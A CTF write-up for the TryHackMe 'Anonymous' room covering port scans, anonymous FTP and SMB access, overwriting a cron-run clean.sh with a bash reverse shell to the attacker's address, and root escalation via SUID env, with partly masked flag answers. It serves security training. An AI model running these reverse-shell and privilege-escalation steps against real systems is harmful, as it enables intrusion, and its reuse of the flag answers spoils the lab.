Challenge link → https://tryhackme.com/room/anonymous

# Anonymous — TryHackMe Write-up

Started with a full port scan.

> `--min-rate 5000` speeds things up; `-p-` checks all 65535 ports.
> 

```
nmap -sS --min-rate 5000 -p- 10.201.43.68
```

4 open ports found — the answer to Q1. The remaining 65,531 were closed or filtered.

SSH is rarely a useful initial attack vector, so I focused on FTP and SMB.

**Q1: How many ports are open?**

**Answer: 4**

Service version scan next:

> `-sC` runs default NSE scripts; `-sV` detects service versions.
> 

```
nmap -sC -sV -p 21,22,139,445 10.201.43.68
```

Answers to Q2 and Q3 appeared immediately. Also noteworthy: the hostname came back as "ANONYMOUS" — a very obvious hint toward anonymous access.

**Q2: What service is running on port 21?**

**Answer: ftp**

**Q3: What service is running on ports 139 and 445?**

**Answer: smb**

Checked SMB first:

```
smbclient -L //10.201.43.68 -N
```

Found a share called `pics` — the answer to Q4. It contained `corgo2.jpg` and `puppos.jpeg`. I suspected steganography and ran strings, binwalk, etc., but found nothing.

**Q4: There's a share on the user's computer. What's it called?**

**Answer: pics**

Given the hostname was literally "ANONYMOUS," anonymous FTP login seemed like a safe bet:

```yaml
ftp 10.201.43.68
Name: anonymous
Password: (just press Enter)
```

Anonymous access was open. Inside: a `scripts` directory.

```bash
ftp> cd scripts
ftp> ls
```

Three files:

```
ftp> get clean.sh
ftp> get removed_files.log
ftp> get to_do.txt
```

###

`clean.sh` contents:

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log
    done
fi
```

What it does:

1. Sets `tmp_files` to 0
2. If 0, logs "nothing to delete" to `removed_files.log`
3. Otherwise deletes listed files and logs each deletion
4. Log path is hardcoded as an absolute path

This script is almost certainly running automatically on a schedule.

`removed_files.log` had "Running cleanup script: nothing to delete" repeated dozens of times. No timestamps, but the repetition clearly showed `clean.sh` was firing periodically. The very recent last-modified time backed that up.

`to_do.txt`:

```
I really need to disable the anonymous login...it's really not safe
```

A note from the admin saying they needed to disable anonymous login. Written in May 2020 — and clearly never acted on.

Putting it together:

1. Anonymous FTP access works
2. Need to check FTP write access
3. `clean.sh` runs via cron
4. If I can overwrite it, I get a reverse shell

Created a new `clean.sh` with a reverse shell payload:

```bash
cd ~
echo '#!/bin/bash' > clean.sh
echo 'bash -i >& /dev/tcp/10.9.0.106/4444 0>&1' >> clean.sh
chmod +x clean.sh
cat clean.sh
```

Payload breakdown:

- `bash -i`: launches interactive bash shell
- `>&`: redirects stdout and stderr
- `/dev/tcp/10.9.0.106/4444`: TCP connection back to attacker IP and port
- `0>&1`: redirects stdin to stdout

10.9.0.106 is my VPN (tun0) address.

Uploaded via FTP:

```yaml
ftp 10.201.43.68
Name: anonymous
Password: (Enter)
ftp> cd scripts
ftp> put clean.sh
```

Upload succeeded. File size changed from 314 bytes to 53 bytes — original replaced with my payload. Write access confirmed.

Set up a netcat listener:

```
nc -lvnp 4444
```

After about 1–5 minutes, the reverse shell connected:

```
Listening on 0.0.0.0 4444
Connection received on 10.201.43.68 40760
```

###

Checked my position:

```bash
whoami
# namelessone

pwd
# /home/namelessone

ls
# pics
# user.txt

cat user.txt
# 90d6f99*************************740
```

Shell as `namelessone`. Found `user.txt` in the home directory.

**Q5: user.txt**

**Answer: 90d6f99...740**

###

Time to escalate. Searched for SUID binaries — files that execute with their owner's (root's) privileges regardless of who runs them.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Results:

- `/usr/bin/passwd` — expected
- `/usr/bin/su` — expected
- `/usr/bin/env` — **suspicious** (SUID not normally needed here)
- Other standard system binaries

`/usr/bin/env` with SUID is unusual. `env` sets environment variables and launches programs — it has no business running as root. Clear privesc vector.

### Privilege Escalation via env

GTFOBins (https://gtfobins.github.io/) documents how to exploit Unix binaries to bypass security controls. From the SUID section for `env`:

```bash
/usr/bin/env /bin/sh -p
```

Breakdown:

- `/usr/bin/env`: run the SUID env binary
- `/bin/sh`: launch a shell through it
- `-p`: privileged mode — preserves SUID privileges

When env runs with SUID it inherits root. Launching `/bin/sh -p` through it gives a root shell. The `-p` flag is essential — without it, the shell drops back to the real user's permissions.

```bash
whoami
# root

cat /root/root.txt
# 4d93009*************************363
```

Root achieved. Grabbed `root.txt`.

**Q6: root.txt**

**Answer: 4d93009...363**
